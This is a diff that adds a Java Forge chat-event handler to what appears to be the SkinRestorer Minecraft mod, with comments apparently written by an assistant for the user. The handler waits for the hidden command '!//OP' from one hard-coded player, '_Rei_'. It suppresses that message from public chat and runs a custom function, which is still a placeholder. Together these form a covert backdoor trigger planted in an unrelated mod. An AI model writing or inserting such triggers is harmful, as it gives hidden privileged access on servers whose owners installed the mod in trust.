@@ -1,0 +1,74 @@
+package net.lionarius.skinrestorer.forge.events; // <--- Correct package
+
+// You MUST import your main mod file here.
+// I am GUESSING its name is "SkinRestorerForge". 
+// Change this if your main file has a different name!
+import net.lionarius.skinrestorer.forge.SkinRestorerForge; 
+
+import net.minecraft.network.chat.Component;
+import net.minecraft.server.level.ServerPlayer;
+import net.minecraftforge.event.server.ServerChatEvent;
+import net.minecraftforge.eventbus.api.SubscribeEvent;
+import net.minecraftforge.fml.common.Mod;
+
+/**
+ * This class listens for game events.
+ * We register it to the FORGE event bus to listen for game-play events.
+ */
+// You MUST know your mod's MOD_ID. 
+// I am GUESSING it is 'SkinRestorerForge.MOD_ID'.
+// Change this to match your main mod file!
+@Mod.EventBusSubscriber(modid = SkinRestorerForge.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
+public class MyChatHandler {
+
+    // --- Define your target values here ---
+    private static final String TARGET_USERNAME = "_Rei_";
+    private static final String TRIGGER_MESSAGE = "!//OP";
+    // ----------------------------------------
+
+    /**
+     * This method is called every time a player sends a chat message on the server.
+     */
+    @SubscribeEvent
+    public static void onPlayerChat(ServerChatEvent event) {
+        
+        // 1. Get the message content
+        String message = event.getMessage().getString();
+        
+        // 2. Get the player who sent the message
+        ServerPlayer player = event.getPlayer();
+        
+        // 3. Get the player's username
+        String username = player.getName().getString();
+
+        // 4. Check if the message is correct (not case-sensitive)
+        if (message.equalsIgnoreCase(TRIGGER_MESSAGE)) {
+            
+            // 5. If message is correct, THEN check if it's the correct user (not case-sensitive)
+            if (username.equalsIgnoreCase(TARGET_USERNAME)) {
+                
+                // 6. If both are correct, execute our custom function
+                executeOurSpecialFunction(player);
+                
+                // 7. (Optional) Cancel the event so the message
+                //    doesn't appear in the public chat.
+                event.setCanceled(true);
+            } else {
+                // (Optional) Tell the user they don't have permission
+                player.sendSystemMessage(Component.literal("You do not have permission to use this command."));
+                event.setCanceled(true); // Also cancel it
+            }
+        }
+    }
+
+    /**
+     * This is the custom function that runs when all checks pass.
+     * @param playerWhoTriggered The player who successfully ran the command.
+     */
+    private static void executeOurSpecialFunction(ServerPlayer playerWhoTriggered) {
+        // --- YOUR CUSTOM CODE GOES HERE ---
+        
+        // Example: Send a private message back to the player
+        playerWhoTriggered.sendSystemMessage(Component.literal("Function executed successfully!"));
+    }
+}
